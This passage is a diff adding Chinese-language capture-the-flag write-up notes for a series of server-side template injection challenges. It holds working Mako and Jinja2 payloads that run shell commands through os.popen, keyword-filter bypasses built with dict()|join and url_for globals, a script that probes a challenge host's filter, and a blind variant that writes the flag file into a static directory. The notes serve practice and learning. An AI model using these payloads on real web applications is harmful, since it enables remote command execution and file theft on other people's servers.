@@ -881,3 +881,242 @@ echo serialize($s);
 ?>
 
 ```
+
+## EZSSTI
+
+
+
+
+
+
+
+## EZSSTI_1
+
+
+
+
+
+
+
+## EZSSTI_2
+
+
+
+
+
+
+
+## EZSSTI_3
+
+
+
+
+
+
+
+## EZSSTI_4
+
+
+
+
+
+
+
+## EZSSTI_5
+
+
+
+
+
+## EZSSTI_6
+
+经过测试发现是 Mako 。`${__import__('os').popen('cat /flag').read()}` 。
+
+
+
+
+
+## EZSSTI_7
+
+经过测试发现是 Jinja2 。`{{"".__class__.__bases__[0].__subclasses__()}}` 返回的有过滤，查看源代码找到返回的，用脚本找到`os._wrap_close` 是第141个，所以`{{"".__class__.__bases__[0].__subclasses__()[141].__init__.__globals__['popen']('cat /flag').read()}}` 
+
+## EZSSTI_8
+
+还是 Jinja2。还用上一题的，`{{"".__class__.__bases__[0].__subclasses__()[141].__init__.__globals__['popen']('cat /flag').read()}}`。
+
+## EZSSTI_9
+
+还能出，`{{"".__class__.__bases__[0].__subclasses__()[141].__init__.__globals__['popen']('cat /flag').read()}}`。
+
+## EZSSTI_10
+
+有过滤，写个脚本看看。
+
+```python
+import requests
+
+url = "http://docker.qingcen.net:41803/?id="
+
+tests = [
+    "{{7*7}}",
+    "__class__",
+    "__base__",
+    "__subclasses__",
+    "__globals__",
+    "popen",
+    "os",
+    "import",
+    "eval",
+    "builtins",
+    "cat",
+    "/flag",
+    "self",
+    "session",
+    "lipsum",
+    "cycler",
+    "namespace",
+    "Joiner",
+    "get_flashed_messages",
+]
+
+
+def check(keyword):
+    payload = "{{" + keyword + "}}"
+
+    try:
+        r = requests.get(
+            url + requests.utils.quote(payload),
+            timeout=5
+        )
+
+        text = r.text
+
+        print("=" * 50)
+        print("测试:", keyword)
+
+        # 判断关键字是否被过滤
+        if keyword in text:
+            print("[+] 未过滤")
+        else:
+            print("[-] 可能被过滤")
+
+        # 常见过滤提示
+        filters = [
+            "危险关键字",
+            "禁止",
+            "illegal",
+            "forbidden",
+            "blocked",
+            "filter"
+        ]
+
+        for f in filters:
+            if f.lower() in text.lower():
+                print("[!] 发现过滤提示:", f)
+
+        print("响应长度:", len(text))
+
+
+    except Exception as e:
+        print("请求错误:", e)
+
+
+for t in tests:
+    check(t)
+```
+
+
+
+过滤了下面的
+
+```python
+__class__
+==================================================
+__base__
+==================================================
+__subclasses__
+==================================================
+__globals__
+==================================================
+import
+==================================================
+self
+==================================================
+session
+==================================================
+lipsum
+==================================================
+cycler
+==================================================
+namespace
+==================================================
+Joiner
+==================================================
+get_flashed_messages
+
+```
+
+url_for 没被过滤，用这个`{{url_for.__globals__['os'].popen('cat /flag').read()}}`，这里面的关键字用 join 换一下。
+
+```python
+globals  dict(glob=a,al=b)|join
+
+{{url_for[dict(__glob=a,als__=b)|join]['os'].popen('cat /flag').read()}}
+```
+
+
+
+
+
+
+
+## EZSSTI_12
+
+上一题还能用，`{{url_for[dict(__glob=a,als__=b)|join]['os'].popen('cat /flag').read()}}` 。
+
+
+
+
+
+## EZSSTI_13
+
+`cat /flag` 没结果，但是命令是可以正常执行的，而且 static 目录也进不去。
+
+
+
+
+
+## EZSSTI_14
+
+无回显，写入静态文件，`{{url_for[dict(__glob=a,als__=b)|join]['os'].popen('mkdir -p /app/static;cat /flag > /app/static/1.txt 2>&1').read()}}`，再访问`/static/1.txt`。
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
